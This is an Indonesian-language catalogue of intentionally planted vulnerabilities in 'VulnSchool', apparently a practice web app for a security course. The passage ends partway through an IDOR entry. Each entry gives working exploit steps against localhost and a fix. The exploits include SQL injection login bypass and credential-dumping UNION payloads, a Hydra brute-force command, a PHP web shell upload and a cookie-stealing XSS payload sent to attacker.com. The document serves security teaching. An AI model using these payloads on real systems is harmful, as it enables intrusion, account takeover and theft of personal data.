# 🔓 VulnSchool — Daftar Kerentanan yang Disengaja

> **⚠️ PERINGATAN:** Dokumen ini berisi daftar kerentanan keamanan yang **sengaja
> ditanamkan** dalam aplikasi VulnSchool untuk tujuan pendidikan. **JANGAN** gunakan
> informasi ini untuk menyerang sistem lain tanpa izin.

---

## Ringkasan Kerentanan

| Kode           | Nama                              | Kategori              | Severity  |
|----------------|-----------------------------------|-----------------------|-----------|
| VULN-SQLI-001  | SQL Injection pada Login          | Injection (A03:2021)  | Critical  |
| VULN-AUTH-001  | Password Disimpan Plain Text      | Crypto Failure (A02)  | Critical  |
| VULN-AUTH-002  | Reset Token Lemah (Predictable)   | Crypto Failure (A02)  | High      |
| VULN-AUTH-003  | Tidak Ada Rate Limiting           | Broken Auth (A07)     | High      |
| VULN-AUTH-004  | Session ID Tidak Di-Regenerate    | Broken Auth (A07)     | Medium    |
| VULN-AUTH-005  | Username Enumeration              | Broken Auth (A07)     | Medium    |
| VULN-MASS-001  | Mass Assignment di Register       | Broken Access (A01)   | Critical  |
| VULN-XSS-001   | Stored XSS via Komentar           | Injection (A03:2021)  | High      |
| VULN-SQLI-002  | SQL Injection pada Search         | Injection (A03:2021)  | Critical  |
| VULN-IDOR-001  | IDOR pada Profil Mahasiswa        | Broken Access (A01)   | High      |
| VULN-IDOR-002  | IDOR pada Edit Profil             | Broken Access (A01)   | High      |
| VULN-UPLOAD-001| Unrestricted File Upload          | Security Misconfig    | Critical  |
| VULN-SQLI-003  | Second-Order SQL Injection        | Injection (A03:2021)  | Critical  |
| VULN-IDOR-003  | IDOR Detail MK Dosen              | Broken Access (A01)   | High      |
| VULN-MASS-002  | Mass Assignment Edit Profil Dosen | Broken Access (A01)   | Critical  |
| VULN-IDOR-004  | **IDOR Nilai (TARGET P11)**        | Broken Access (A01)   | Critical  |
| VULN-IDOR-005  | IDOR List Nilai (Bulk)            | Broken Access (A01)   | High      |
| VULN-SQLI-004  | SQL Injection Filter Nilai        | Injection (A03:2021)  | Critical  |
| VULN-IDOR-006  | IDOR Absensi Mahasiswa            | Broken Access (A01)   | Medium    |
| VULN-MASS-003  | Mass Assignment Update Absensi    | Broken Access (A01)   | High      |
| VULN-XSS-001   | Stored XSS Komentar Pengumuman    | Injection (A03:2021)  | Critical  |
| VULN-XSS-002   | Reflected XSS Search Pengumuman   | Injection (A03:2021)  | High      |
| VULN-INFO-001  | Information Disclosure robots.txt | Security Misc (A05)   | Medium    |
| VULN-INFO-002  | Sensitive Files Exposed           | Security Misc (A05)   | High      |
| VULN-IDOR-007  | Path Traversal Log Viewer         | Broken Access (A01)   | Critical  |
| VULN-AUTH-006  | Endpoint API Tanpa Autentikasi    | Broken Access (A01)   | Critical  |

---

## Detail Kerentanan

### VULN-SQLI-001: SQL Injection pada Login

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-SQLI-001                                              |
| **Kategori** | Injection — OWASP A03:2021                                 |
| **Lokasi**   | `app/Controllers/Auth.php` — method `login()`              |
| **Severity** | 🔴 Critical                                                |

**Deskripsi:**
Input `username` dan `password` dari form login langsung dimasukkan ke dalam query SQL
tanpa sanitasi atau parameter binding:
```php
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password' AND is_active = 1";
```

**Dampak:**
- Bypass autentikasi (login tanpa password yang benar)
- Ekstraksi seluruh data dari database (UNION-based SQLi)
- Modifikasi atau penghapusan data (jika multi-statement diizinkan)

**Cara Eksploitasi:**

1. **Bypass Login (Authentication Bypass):**
   ```
   Username: admin' -- 
   Password: (apa saja, misal: x)
   ```
   Query menjadi:
   ```sql
   SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'x' AND is_active = 1
   ```
   Bagian setelah `--` diabaikan → login sebagai admin.

2. **Login sebagai user pertama tanpa tahu username:**
   ```
   Username: ' OR '1'='1' -- 
   Password: (apa saja)
   ```

3. **UNION-based SQLi (ekstrak data):**
   ```
   Username: ' UNION SELECT 1,'admin','pass','email','Admin','admin',1,1,NULL,'2024-01-01','2024-01-01' -- 
   Password: pass
   ```

**Fix:**
```php
// Gunakan Query Builder dengan parameter binding
$user = $this->userModel->where('username', $username)->first();
if ($user && password_verify($password, $user['password'])) {
    // Login berhasil
}
```

---

### VULN-AUTH-001: Password Disimpan Plain Text

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-AUTH-001                                              |
| **Kategori** | Cryptographic Failures — OWASP A02:2021                    |
| **Lokasi**   | `app/Controllers/Auth.php` — method `register()`, `resetPassword()` |
| **Severity** | 🔴 Critical                                                |

**Deskripsi:**
Password user disimpan di database dalam bentuk teks biasa (plain text) tanpa di-hash.
Hal ini terlihat di:
- Proses registrasi: `$userModel->insert($data)` — password langsung disimpan
- Proses reset password: `'password' => $password` — tanpa hashing
- Data seeder: semua password dalam plain text

**Dampak:**
- Jika database bocor (via SQLi atau backup yang tidak aman), SEMUA password pengguna
  langsung terbaca tanpa perlu di-crack
- Pelanggaran prinsip defense-in-depth

**Cara Eksploitasi:**
```sql
-- Via phpMyAdmin atau SQLi, jalankan:
SELECT username, password FROM users;
-- Semua password langsung terlihat: admin123, dosen123, mhs123, dll.
```

**Fix:**
```php
// Saat register/reset password:
$data['password'] = password_hash($data['password'], PASSWORD_DEFAULT);

// Saat login (verifikasi):
if ($user && password_verify($password, $user['password'])) {
    // Login berhasil
}
```

---

### VULN-AUTH-002: Reset Token Lemah (Predictable)

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-AUTH-002                                              |
| **Kategori** | Cryptographic Failures — OWASP A02:2021                    |
| **Lokasi**   | `app/Controllers/Auth.php` — method `forgotPassword()`     |
| **Severity** | 🟠 High                                                    |

**Deskripsi:**
Token reset password dibuat menggunakan `md5(time())`, yang berbasis waktu server.
Karena `time()` mengembalikan Unix timestamp (detik), attacker yang mengetahui
perkiraan waktu request bisa menghitung token yang valid.

```php
$token = md5(time()); // Predictable!
```

Selain itu, token tidak memiliki batas waktu kadaluarsa (expiry).

**Dampak:**
- Attacker bisa melakukan brute-force terhadap range timestamp
- Token yang bocor bisa digunakan kapan saja (tidak pernah expire)
- Account takeover tanpa akses email korban

**Cara Eksploitasi:**
```python
import hashlib, time

# Generate token untuk range waktu ±60 detik
base_time = int(time.time())
for t in range(base_time - 60, base_time + 60):
    token = hashlib.md5(str(t).encode()).hexdigest()
    print(f"Coba token: {token}")
    # Lalu akses: http://localhost:8080/reset-password?token={token}
```

**Fix:**
```php
// Gunakan token kriptografis yang kuat
$token = bin2hex(random_bytes(32));

// Tambahkan expiry
$this->userModel->update($user['id'], [
    'reset_token' => $token,
    'reset_token_expires_at' => date('Y-m-d H:i:s', strtotime('+1 hour')),
]);

// Saat validasi, cek expiry
$user = $this->userModel->where('reset_token', $token)
    ->where('reset_token_expires_at >', date('Y-m-d H:i:s'))
    ->first();
```

---

### VULN-AUTH-003: Tidak Ada Rate Limiting di Login

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-AUTH-003                                              |
| **Kategori** | Identification & Authentication Failures — OWASP A07:2021  |
| **Lokasi**   | `app/Controllers/Auth.php` — method `login()`              |
| **Severity** | 🟠 High                                                    |

**Deskripsi:**
Endpoint login (`POST /login`) tidak memiliki pembatasan jumlah percobaan (rate limiting).
Attacker bisa melakukan percobaan login tanpa batas dalam waktu singkat.

**Dampak:**
- Brute-force attack menggunakan wordlist password
- Credential stuffing menggunakan database password yang bocor
- Denial of service pada akun tertentu

**Cara Eksploitasi:**
```bash
# Menggunakan Hydra (tool brute-force)
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    localhost -s 8080 http-post-form \
    "/login:username=^USER^&password=^PASS^:Password salah"

# Menggunakan curl loop
for pw in $(cat passwords.txt); do
    curl -s -X POST http://localhost:8080/login \
        -d "username=admin&password=$pw" \
        -c cookies.txt -b cookies.txt \
        | grep -q "Dashboard" && echo "FOUND: $pw" && break
done
```

**Fix:**
```php
// Gunakan CI4 Throttler
$throttler = service('throttler');
$key = 'login_' . $this->request->getIPAddress();

if ($throttler->check($key, 5, MINUTE) === false) {
    return redirect()->to('/login')
        ->with('error', 'Terlalu banyak percobaan login. Coba lagi dalam 1 menit.');
}
```

---

### VULN-AUTH-004: Session ID Tidak Di-Regenerate Setelah Login

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-AUTH-004                                              |
| **Kategori** | Identification & Authentication Failures — OWASP A07:2021  |
| **Lokasi**   | `app/Controllers/Auth.php` — method `login()`              |
| **Severity** | 🟡 Medium                                                  |

**Deskripsi:**
Setelah login berhasil, session ID tidak di-regenerate. Session ID yang sama digunakan
sebelum dan sesudah autentikasi, membuat aplikasi rentan terhadap Session Fixation Attack.

**Dampak:**
- Attacker bisa menetapkan (fix) session ID korban sebelum login
- Setelah korban login, attacker menggunakan session ID yang sama untuk mengakses akun korban

**Cara Eksploitasi:**
1. Attacker mengakses `/login`, catat session ID dari cookie `ci_session`
2. Attacker mengirim link ke korban yang memaksa set cookie session ID tersebut
3. Korban login menggunakan link tersebut
4. Attacker menggunakan session ID yang sudah di-set untuk mengakses `/dashboard`

**Fix:**
```php
// Tambahkan sebelum set session data:
session()->regenerate();
session()->set([...]);
```

---

### VULN-AUTH-005: Username Enumeration via Pesan Error

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-AUTH-005                                              |
| **Kategori** | Identification & Authentication Failures — OWASP A07:2021  |
| **Lokasi**   | `app/Controllers/Auth.php` — method `login()`              |
| **Severity** | 🟡 Medium                                                  |

**Deskripsi:**
Aplikasi menampilkan pesan error yang berbeda untuk dua skenario:
- Username tidak ada → **"Username tidak ditemukan"**
- Password salah → **"Password salah"**

Perbedaan ini memungkinkan attacker mengetahui username mana yang valid.

**Dampak:**
- Attacker bisa membangun daftar username valid di sistem
- Daftar username valid digunakan untuk serangan brute-force yang lebih terarah
- Mengurangi waktu dan resource yang dibutuhkan untuk serangan

**Cara Eksploitasi:**
```bash
# Enumerasi username
curl -s -X POST http://localhost:8080/login \
    -d "username=admin&password=wrongpass" | grep -o "Password salah"
# Output: "Password salah" → username 'admin' ada!

curl -s -X POST http://localhost:8080/login \
    -d "username=tidakada&password=wrongpass" | grep -o "Username tidak ditemukan"
# Output: "Username tidak ditemukan" → username 'tidakada' tidak ada
```

**Fix:**
```php
// Gunakan pesan error yang sama untuk kedua skenario:
return redirect()->to('/login')
    ->with('error', 'Username atau password salah.');
```

---

### VULN-MASS-001: Mass Assignment di Register

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-MASS-001                                              |
| **Kategori** | Broken Access Control — OWASP A01:2021                     |
| **Lokasi**   | `app/Controllers/Auth.php` — method `register()`           |
|              | `app/Models/UserModel.php` — `$allowedFields`              |
| **Severity** | 🔴 Critical                                                |

**Deskripsi:**
Saat registrasi, semua data dari POST request diteruskan langsung ke `$userModel->insert()`
tanpa whitelist:
```php
$data = $this->request->getPost();
$this->userModel->insert($data);
```
Karena `UserModel::$allowedFields` berisi `'is_admin'` dan `'role'`, attacker bisa
menambahkan field tersebut di POST body.

**Dampak:**
- Attacker mendaftarkan diri sebagai admin
- Privilege escalation dari mahasiswa ke admin
- Full takeover sistem

**Cara Eksploitasi:**
```bash
# Daftar sebagai admin menggunakan curl
curl -X POST http://localhost:8080/register \
    -d "username=hacker&password=hack123&confirm_password=hack123&email=h@h.com&full_name=Hacker&is_admin=1&role=admin"

# Lalu login dengan akun tersebut
# → Akun baru langsung menjadi admin!
```

**Fix:**
```php
// Whitelist field yang diizinkan
$allowed = ['username', 'password', 'email', 'full_name'];
$data = array_intersect_key($this->request->getPost(), array_flip($allowed));
$data['role'] = 'mahasiswa';  // Force role
$data['is_admin'] = 0;        // Force non-admin
$userModel->insert($data);
```

---

### VULN-XSS-001: Stored XSS via Komentar Pengumuman

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-XSS-001                                              |
| **Kategori** | Injection — OWASP A03:2021                                 |
| **Lokasi**   | `app/Models/KomentarPengumumanModel.php`                   |
|              | (akan dilengkapi di fitur Pengumuman)                      |
| **Severity** | 🟠 High                                                    |

**Deskripsi:**
Field `isi_komentar` pada tabel `komentar_pengumuman` menerima input HTML/JavaScript
tanpa sanitasi, baik saat penyimpanan maupun saat ditampilkan.

**Dampak:**
- Pencurian cookie/session pengguna lain
- Defacement halaman
- Redirect ke situs berbahaya
- Keylogging

**Cara Eksploitasi:**
```
Isi komentar:
<script>alert('XSS Demo - VulnSchool')</script>

Payload lebih berbahaya:
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

**Fix:**
```php
// Di view, gunakan esc() saat menampilkan:
<?= esc($komentar['isi_komentar']) ?>

// Atau sanitasi saat menyimpan:
$data['isi_komentar'] = htmlspecialchars($data['isi_komentar'], ENT_QUOTES, 'UTF-8');
```

---

### VULN-SQLI-002: SQL Injection pada Pencarian Mahasiswa

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-SQLI-002                                              |
| **Kategori** | Injection — OWASP A03:2021                                 |
| **Lokasi**   | `app/Controllers/Admin/Mahasiswa.php` — method `index()`   |
| **Severity** | 🔴 Critical                                                |

**Deskripsi:**
Input pencarian (`?q=`) langsung dimasukkan ke query SQL tanpa sanitasi:
```php
$sql = "SELECT * FROM mahasiswa WHERE nama LIKE '%$keyword%' OR nim LIKE '%$keyword%'";
```

**Dampak:**
- Ekstraksi data dari tabel lain (users, password, dll.)
- Enumerasi seluruh database

**Cara Eksploitasi:**
```
1. Akses: /admin/mahasiswa?q=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13 -- 
2. UNION extract passwords:
   /admin/mahasiswa?q=' UNION SELECT id,user_id,username,password,email,full_name,role,is_admin,reset_token,created_at,updated_at,0,0 FROM users -- 
```

**Fix:**
```php
$mahasiswa = $this->mahasiswaModel
    ->like('nama', $keyword)
    ->orLike('nim', $keyword)
    ->paginate($perPage);
```

---

### VULN-IDOR-001: IDOR pada Profil Mahasiswa

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-IDOR-001                                              |
| **Kategori** | Broken Access Control — OWASP A01:2021                     |
| **Lokasi**   | `app/Controllers/MahasiswaController.php` — method `profil()` |
| **Severity** | 🟠 High                                                    |

**Deskripsi:**
Endpoint `/mahasiswa/profil/{id}` tidak memvalidasi kepemilikan.
Mahasiswa A bisa melihat profil mahasiswa B dengan mengubah ID di URL.

**Dampak:**
- Seluruh data pribadi mahasiswa terekspos (alamat, no HP, nilai)
- Privacy violation — melanggar prinsip least privilege

**Cara Eksploitasi:**
```
1. Login sebagai mhs001
2. Akses /mahasiswa/profil → lihat profil sendiri (id=1)
3. Ubah URL ke /mahasiswa/profil/2 → lihat profil mhs002!
4. Iterasi /mahasiswa/profil/3, /4, /5, ... → lihat semua profil
```

**Fix:**
```php
$mhsLogin = $this->mahasiswaModel->findByUserId(session()->get('user_id'));
if ($id !== null && (int)$id !== (int)$mhsLogin['id']) {
    throw PageNotFoundException::forPageNotFound();
}
```

---

### VULN-IDOR-002: IDOR pada Edit Profil

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-IDOR-002                                              |
| **Kategori** | Broken Access Control — OWASP A01:2021                     |
| **Lokasi**   | `app/Controllers/MahasiswaController.php` — method `updateProfil()` |
| **Severity** | 🟠 High                                                    |

**Deskripsi:**
ID mahasiswa diambil dari hidden input form (`$this->request->getPost('id')`).
Attacker bisa mengubah nilai hidden input via browser DevTools atau curl.

**Dampak:**
- Mahasiswa bisa mengedit profil mahasiswa lain
- Mengubah alamat, no HP, bahkan foto profil orang lain

**Cara Eksploitasi:**
```bash
# Login sebagai mhs001 (id mahasiswa = 1)
# Edit profil mhs002 (id mahasiswa = 2)
curl -X POST http://localhost:8080/mahasiswa/profil/update \
    -b "ci_session=<session_cookie>" \
    -d "id=2&alamat=HACKED&no_hp=000"
```

**Fix:**
```php
$mhsLogin = $this->mahasiswaModel->findByUserId(session()->get('user_id'));
$id = $mhsLogin['id']; // Ambil dari session, bukan input
```

---

### VULN-UPLOAD-001: Unrestricted File Upload

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-UPLOAD-001                                            |
| **Kategori** | Security Misconfiguration — OWASP A05:2021                 |
| **Lokasi**   | `app/Controllers/MahasiswaController.php` — method `updateProfil()` |
| **Severity** | 🔴 Critical                                                |

**Deskripsi:**
File upload pada foto profil tidak memvalidasi:
- MIME type (bisa upload PHP, exe, dll.)
- Ekstensi file
- Ukuran file
- Nama file tidak di-rename (nama asli dipakai)

**Dampak:**
- **Remote Code Execution (RCE)** — attacker upload web shell PHP
- Full server compromise — bisa menjalankan perintah apapun di server
- Akses ke seluruh file, database, dan konfigurasi sistem

**Cara Eksploitasi:**
```bash
# 1. Buat file web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 2. Upload via form edit profil (atau curl)
curl -X POST http://localhost:8080/mahasiswa/profil/update \
    -b "ci_session=<session_cookie>" \
    -F "id=1" -F "alamat=test" -F "no_hp=08123" \
    -F "foto=@shell.php"

# 3. Akses web shell
curl "http://localhost:8080/uploads/foto/shell.php?cmd=whoami"
# Output: www-data

curl "http://localhost:8080/uploads/foto/shell.php?cmd=cat /etc/passwd"
# Output: isi file /etc/passwd
```

**Fix:**
```php
$rules = [
    'foto' => 'uploaded[foto]|max_size[foto,2048]|is_image[foto]|mime_in[foto,image/jpg,image/jpeg,image/png]'
];
if (!$this->validate($rules)) {
    return redirect()->back()->with('errors', $this->validator->getErrors());
}
$newName = $foto->getRandomName();
$foto->move(WRITEPATH . '../public/uploads/foto', $newName);
```

---

### VULN-SQLI-003: Second-Order SQL Injection via kode_mk

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-SQLI-003                                              |
| **Kategori** | Injection — OWASP A03:2021                                 |
| **Lokasi**   | `app/Controllers/Admin/MataKuliah.php` — method `store()`, `update()`, `detail()` |
| **Severity** | 🔴 Critical                                                |

**Deskripsi:**
Nilai `kode_mk` dari form disimpan ke database tanpa sanitasi (first-order insert).
Saat data tersebut dibaca kembali dan digunakan di raw SQL query pada method `detail()`,
payload SQLi yang tersimpan akan tereksekusi (second-order execution):
```php
// Saat INSERT — payload tersimpan apa adanya
$data = ['kode_mk' => $this->request->getPost('kode_mk'), ...];
$this->mkModel->insert($data);

// Saat DETAIL — kode_mk dari DB dipakai di raw query
$kodeMk = $mk['kode_mk']; // dari database, bisa berisi payload
$db->query("SELECT COUNT(*) as total FROM nilai
            JOIN mata_kuliah ON mata_kuliah.id = nilai.mata_kuliah_id
            WHERE mata_kuliah.kode_mk = '$kodeMk'");
```

**Dampak:**
- Payload SQLi tertanam di database, tereksekusi setiap kali halaman detail MK diakses
- Lebih sulit dideteksi karena injection terjadi di tahap berbeda dari input
- Dapat mengekstrak data sensitif (password, data mahasiswa, dll.)

**Cara Eksploitasi:**
```
1. Admin buat MK baru dengan kode_mk:
   INF' UNION SELECT GROUP_CONCAT(username,':',password) FROM users -- 

2. Saat admin/dosen membuka detail MK tersebut, query report akan
   mengeksekusi payload dan menampilkan data users

3. Alternatif — inject kode_mk via curl:
   curl -X POST http://localhost:8080/admin/mata-kuliah/store \
     -b "ci_session=<cookie>" \
     -d "kode_mk=X' UNION SELECT password FROM users WHERE username='admin' -- &nama_mk=Test&sks=3&dosen_id=1&semester=1"
```

**Fix:**
```php
// Sanitasi input sebelum simpan:
$kode_mk = preg_replace('/[^A-Za-z0-9\-]/', '', $this->request->getPost('kode_mk'));

// Gunakan parameter binding di semua query:
$db->query("SELECT COUNT(*) as total FROM nilai
            JOIN mata_kuliah ON mata_kuliah.id = nilai.mata_kuliah_id
            WHERE mata_kuliah.kode_mk = ?", [$kodeMk]);
```

---

### VULN-IDOR-003: IDOR pada Detail Mata Kuliah Dosen

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-IDOR-003                                              |
| **Kategori** | Broken Access Control — OWASP A01:2021                     |
| **Lokasi**   | `app/Controllers/DosenController.php` — method `detailMataKuliah()` |
| **Severity** | 🟠 High                                                    |

**Deskripsi:**
Endpoint `/dosen/mata-kuliah/{id}` tidak memvalidasi apakah dosen yang login adalah
pengampu dari mata kuliah yang diminta. Dosen manapun bisa melihat detail mata kuliah
milik dosen lain beserta daftar mahasiswa dan nilai mereka.

```php
// Tidak ada pengecekan kepemilikan — langsung ambil berdasarkan ID
$mk = $this->mkModel->find($id);
// Seharusnya cek: $mk['dosen_id'] === $dosenLogin['id']
```

**Dampak:**
- Dosen A bisa melihat detail mata kuliah, daftar mahasiswa, dan nilai di MK milik dosen B
- Pelanggaran privasi data akademik
- Informasi sensitif tentang kinerja mahasiswa di MK lain terekspos

**Cara Eksploitasi:**
```
1. Login sebagai dosen1 (mengampu MK id=1)
2. Akses /dosen/mata-kuliah/1 → lihat detail MK sendiri ✓
3. Ubah URL ke /dosen/mata-kuliah/2 → lihat detail MK dosen2! ✗
4. Iterasi /dosen/mata-kuliah/3, /4, ... → lihat semua MK

# Atau via curl:
curl http://localhost:8080/dosen/mata-kuliah/2 \
  -b "ci_session=<dosen1_session>"
# → menampilkan detail MK milik dosen2 beserta mahasiswa & nilai
```

**Fix:**
```php
public function detailMataKuliah($id)
{
    $dosen = $this->dosenModel->findByUserId(session()->get('user_id'));
    $mk = $this->mkModel->find($id);

    // Validasi kepemilikan
    if (!$mk || (int)$mk['dosen_id'] !== (int)$dosen['id']) {
        throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
    }
    // ... lanjutkan proses
}
```

---

### VULN-MASS-002: Mass Assignment di Edit Profil Dosen

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-MASS-002                                              |
| **Kategori** | Broken Access Control — OWASP A01:2021                     |
| **Lokasi**   | `app/Controllers/Admin/Dosen.php` — method `update()`      |
|              | `app/Controllers/DosenController.php` — method `updateProfil()` |
| **Severity** | 🔴 Critical                                                |

**Deskripsi:**
Seluruh data POST diteruskan langsung ke `$this->dosenModel->update()` tanpa whitelist:
```php
$this->dosenModel->update($id, $this->request->getPost());
```
Karena `DosenModel::$allowedFields` berisi `'user_id'`, attacker bisa menambahkan field
`user_id` di POST body untuk mengganti pemilik profil dosen → account takeover.

**Dampak:**
- Attacker bisa mengubah `user_id` di profil dosen → mengambil alih akun dosen lain
- Dosen A login ke akun dosen B (privilege escalation)
- Account takeover tanpa perlu password korban

**Cara Eksploitasi:**
```bash
# Skenario: Dosen A (user_id=4) ingin mengambil alih akun Dosen B (user_id=5)

# 1. Via Admin panel (sebagai admin yang tercompromise):
curl -X POST http://localhost:8080/admin/dosen/update/1 \
  -b "ci_session=<admin_session>" \
  -d "nip=198001&nama=Dosen A&bidang_keahlian=Hacking&no_hp=08123&user_id=5"
# → Profil dosen id=1 sekarang terhubung ke user_id=5 (akun Dosen B)

# 2. Via form edit profil dosen (sebagai dosen):
curl -X POST http://localhost:8080/dosen/profil/update \
  -b "ci_session=<dosen_a_session>" \
  -d "bidang_keahlian=Security&no_hp=08123&user_id=5"
# → Profil dosen A sekarang terhubung ke user_id=5
# → Saat user_id=5 login, ia akan melihat profil dosen A
```

**Fix:**
```php
// Whitelist field yang diizinkan — JANGAN include user_id
$data = [
    'nip'             => $this->request->getPost('nip'),
    'nama'            => $this->request->getPost('nama'),
    'bidang_keahlian' => $this->request->getPost('bidang_keahlian'),
    'no_hp'           => $this->request->getPost('no_hp'),
];
$this->dosenModel->update($id, $data);

// Atau hapus 'user_id' dari $allowedFields di DosenModel
```

---

### VULN-IDOR-004: IDOR pada Detail Nilai Mahasiswa (🎯 TARGET P11 PRAKTIKUM)

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-IDOR-004                                              |
| **Kategori** | Broken Access Control — OWASP A01:2021                     |
| **Lokasi**   | `app/Controllers/NilaiController.php` — method `detail()`  |
| **Severity** | 🔴 Critical                                                |

> ⚠️ **TARGET UTAMA DEMONSTRASI P11 PRAKTIKUM KEAMANAN INFORMASI**

**Deskripsi:**
Method `detail()` hanya menerima `nilai_id` tanpa validasi kepemilikan.
Mahasiswa A bisa mengakses nilai mahasiswa B dengan menebak/iterate ID.
Tidak ada pengecekan apakah record nilai tersebut milik mahasiswa yang login.

```php
public function detail($nilai_id) {
    // TIDAK ada cek mahasiswa_id == session
    $nilai = $this->nilaiModel->getNilaiDetail((int) $nilai_id);
    return view('mahasiswa/nilai/detail', ['nilai' => $nilai]);
}
```

**Dampak:**
- Privacy violation tinggi — nilai akademik adalah data sensitif
- Attacker bisa scrape seluruh database nilai dengan iterate ID
- Informasi identitas mahasiswa, NIM, grade, dan nama MK terekspos
- Pelanggaran UU Perlindungan Data Pribadi (jika di produksi)

**Cara Eksploitasi (Demo P11):**
```
Skenario: Login sebagai mhs001, curi nilai mhs002

1. Login sebagai mhs001
2. Buka /mahasiswa/nilai → lihat transcript sendiri
3. Klik "Detail" pada salah satu nilai → catat URL, misal /mahasiswa/nilai/1
4. ID nilai mhs001: 1, 2, 3 (karena mhs001 ambil 3 MK)
5. Coba akses /mahasiswa/nilai/4 → tampil nilai milik mhs002!
6. Iterate: /mahasiswa/nilai/5, /6, /7, ... → semua nilai muncul

# Script otomatis (Python):
import requests
session = requests.Session()
session.post('http://localhost:8080/login', data={'username':'mhs001','password':'mhs123'})
for i in range(1, 31):
    r = session.get(f'http://localhost:8080/mahasiswa/nilai/{i}')
    if r.status_code == 200 and 'Detail Nilai' in r.text:
        print(f'ID {i}: ACCESSIBLE')
```

**Fix:**
```php
public function detail($nilai_id) {
    $mahasiswa = $this->mahasiswaModel->findByUserId(session()->get('user_id'));
    $nilai = $this->nilaiModel
                 ->where('id', $nilai_id)
                 ->where('mahasiswa_id', $mahasiswa['id'])
                 ->first();
    if (!$nilai) {
        throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
    }
    // ... lanjutkan render
}
```

---

### VULN-IDOR-005: IDOR pada List Nilai (Bulk)

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-IDOR-005                                              |
| **Kategori** | Broken Access Control — OWASP A01:2021                     |
| **Lokasi**   | `app/Controllers/NilaiController.php` — method `index()`   |
| **Severity** | 🟠 High                                                    |

**Deskripsi:**
Parameter `mhs_id` dari GET request digunakan langsung untuk menentukan mahasiswa
mana yang ditampilkan nilai-nya. Jika parameter tidak ada, baru fallback ke session.
Attacker cukup menambahkan `?mhs_id=2` untuk melihat seluruh transcript mahasiswa lain.

```php
$mhs_id = $this->request->getGet('mhs_id') ?? ($mahasiswa ? $mahasiswa['id'] : null);
$nilaiList = $this->nilaiModel->getNilaiByMahasiswa((int) $mhs_id);
```

**Dampak:**
- Seluruh transcript akademik (KHS) mahasiswa lain terekspos
- Lebih berbahaya dari IDOR-004 karena leak data secara bulk
- Attacker bisa iterate `?mhs_id=1,2,3,...` untuk dump semua transcript

**Cara Eksploitasi:**
```
1. Login sebagai mhs001
2. Buka /mahasiswa/nilai → lihat transcript sendiri
3. Ubah URL ke /mahasiswa/nilai?mhs_id=2 → tampil semua nilai mhs002!
4. Coba /mahasiswa/nilai?mhs_id=3 → transcript mhs003
5. Iterate 1-10 untuk lihat semua mahasiswa

# curl:
curl http://localhost:8080/mahasiswa/nilai?mhs_id=2 \
  -b "ci_session=<mhs001_session>"
# → menampilkan seluruh transcript akademik mhs002
```

**Fix:**
```php
// Hapus parameter mhs_id, SELALU gunakan session:
$mahasiswa = $this->mahasiswaModel->findByUserId(session()->get('user_id'));
$nilaiList = $this->nilaiModel->getNilaiByMahasiswa($mahasiswa['id']);
// JANGAN: $this->request->getGet('mhs_id')
```

---

### VULN-SQLI-004: SQL Injection di Filter Nilai

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-SQLI-004                                              |
| **Kategori** | Injection — OWASP A03:2021                                 |
| **Lokasi**   | `app/Controllers/NilaiController.php` — method `index()`   |
| **Severity** | 🔴 Critical                                                |

**Deskripsi:**
Parameter `semester` dari GET request disisipkan langsung ke raw SQL query
tanpa sanitasi atau parameter binding:

```php
$semester = $this->request->getGet('semester');
$sql = "SELECT ... WHERE nilai.semester_tahun = '$semester'";
$db->query($sql)->getResultArray();
```

**Dampak:**
- SQL Injection klasik — bisa mengekstrak seluruh database
- Bisa dump tabel users (username + password plain text)
- Bisa manipulasi atau hapus data

**Cara Eksploitasi:**
```
# 1. Error-based detection:
/mahasiswa/nilai?semester=' OR 1=1 --

# 2. UNION-based extraction (dump credentials):
/mahasiswa/nilai?semester=' UNION SELECT 1,2,username,password,5,6,7,8 FROM users --

# 3. Extract all users:
curl "http://localhost:8080/mahasiswa/nilai?semester='%20UNION%20SELECT%201,2,username,password,email,6,7,8%20FROM%20users%20--" \
  -b "ci_session=<session>"
```

**Fix:**
```php
// Gunakan Query Builder dengan parameter binding:
$nilaiList = $this->nilaiModel
    ->select('nilai.*, mata_kuliah.kode_mk, mata_kuliah.nama_mk, mata_kuliah.sks')
    ->join('mata_kuliah', 'mata_kuliah.id = nilai.mata_kuliah_id')
    ->where('nilai.mahasiswa_id', $mhs_id)
    ->where('nilai.semester_tahun', $semester)
    ->findAll();
```

---

### VULN-IDOR-006: IDOR pada Absensi Mahasiswa

| Field        | Detail                                                     |
|--------------|------------------------------------------------------------|
| **Kode**     | VULN-IDOR-006                                              |
| **Kategori** | Broken Access Control — OWASP A01:2021                     |
| **Lokasi**   | `app/Controllers/AbsensiController.php` — method `detail()`|
| **Severity** | 🟡 Medium                                                  |

